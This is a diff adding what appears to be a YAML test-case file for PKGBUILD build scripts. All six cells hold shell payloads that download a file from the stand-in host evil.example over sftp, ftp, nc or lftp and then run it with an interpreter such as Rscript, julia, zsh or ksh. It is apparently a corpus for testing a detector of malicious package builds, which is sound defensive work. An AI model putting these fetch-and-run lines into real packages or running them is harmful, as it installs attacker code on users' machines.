@@ -1,0 +1,37 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.erl"
+        escript s.erl
+  id: 006-sftp-escript
+- vars:
+    payload: |2
+        ftp -n evil.example <<EOF
+      user u p
+      get s.jl
+      bye
+      EOF
+        julia s.jl
+  id: 007-ftp-julia
+- vars:
+    payload: |2
+        nc evil.example 4444 > f.R
+        Rscript f.R
+  id: 009-nc-Rscript
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.sh"
+        zsh < s.sh
+  id: 010-sftp-stdin-zsh
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /s.sh"
+        exec 3<s.sh
+        ksh /dev/fd/3
+  id: 011-fd-ksh
+- vars:
+    payload: |2
+        lftp -c "open -u u,p evil.example; get s.jlh; bye"
+        Rscript s.jlh
+  id: 012-lftp-Rscript
